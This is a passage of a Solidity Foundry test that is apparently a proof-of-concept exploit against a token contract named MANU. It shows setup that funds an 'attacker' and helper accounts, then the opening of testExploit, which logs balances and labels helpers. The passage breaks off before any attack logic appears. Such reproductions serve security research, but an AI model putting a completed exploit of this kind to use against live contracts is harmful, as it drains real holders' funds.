        vm.startPrank(owner);

        // Transfer some tokens to attacker to start
        uint256 initialAmount = 1000 * 10**18;
        MANU(TARGET).transfer(attacker, initialAmount);

        // Also transfer small amounts to helpers to make them holders
        MANU(TARGET).transfer(helper1, 100 * 10**18);
        MANU(TARGET).transfer(helper2, 100 * 10**18);

        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = MANU(TARGET).balanceOf(attacker);
        console.log("Initial attacker balance:", initialBalance);
        console.log("Initial total supply:", MANU(TARGET).totalSupply());

        // Create 3 helper accounts
        address helper1 = address(0x111);
        address helper2 = address(0x222);
        address helper3 = address(0x333);

        vm.label(helper1, "Helper1");
        vm.label(helper2, "Helper2");
        vm.label(helper3, "Helper3");

